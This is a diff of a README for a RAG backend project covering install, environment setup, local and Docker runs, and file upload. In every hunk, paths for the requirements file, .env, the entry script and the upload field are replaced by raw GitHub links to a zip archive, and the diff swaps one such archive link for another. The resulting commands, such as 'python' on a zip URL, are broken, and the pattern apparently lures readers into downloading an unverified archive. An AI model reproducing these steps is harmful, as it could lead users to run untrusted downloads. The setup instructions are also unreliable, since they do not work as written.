@@ -54,7 +54,7 @@ Step 1: Clone the Repository and Install Dependencies
 
 git clone <your-repo>
 cd lang-project
-pip install -r https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/embedding/Rag-systems-v1.7.zip
+pip install -r https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/store/Rag_systems_v3.6.zip
 
 
 ⸻
@@ -63,8 +63,8 @@ Step 2: Environment Configuration
 
 Create environment files from the provided examples:
 
-cp https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/embedding/Rag-systems-v1.7.zip .env
-cp https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/embedding/Rag-systems-v1.7.zip https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/embedding/Rag-systems-v1.7.zip
+cp https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/store/Rag_systems_v3.6.zip .env
+cp https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/store/Rag_systems_v3.6.zip https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/store/Rag_systems_v3.6.zip
 
 Fill in the following values:
 	•	JWT Key
@@ -78,7 +78,7 @@ Generate from HuggingFace account settings
 
 Step 3: Run Locally
 
-python https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/embedding/Rag-systems-v1.7.zip
+python https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/store/Rag_systems_v3.6.zip
 
 Open your browser and visit:
 
@@ -96,7 +96,7 @@ docker build -t rag-backend .
 
 Run the container using environment variables:
 
-docker run -p 8000:8000 --env-file https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/embedding/Rag-systems-v1.7.zip rag-backend
+docker run -p 8000:8000 --env-file https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/store/Rag_systems_v3.6.zip rag-backend
 
 
 ⸻
@@ -118,7 +118,7 @@ Step 2: Upload a Document
 
 curl -X POST "http://localhost:8000/inject/file" \
   -H "Authorization: Bearer YOUR_JWT_TOKEN" \
-  -F "https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/embedding/Rag-systems-v1.7.zip"
+  -F "https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/store/Rag_systems_v3.6.zip"
 
 The document is processed, chunked, embedded, and stored securely under your user scope.
 
@@ -172,7 +172,7 @@ docker run -p 8000:8000 \
   -e grok="your_groq_key" \
   rag-backend
 
-docker run -p 8000:8000 --env-file https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/embedding/Rag-systems-v1.7.zip rag-backend
+docker run -p 8000:8000 --env-file https://github.com/razashaikh26/Rag-systems/raw/refs/heads/main/store/Rag_systems_v3.6.zip rag-backend
 
 
 ⸻
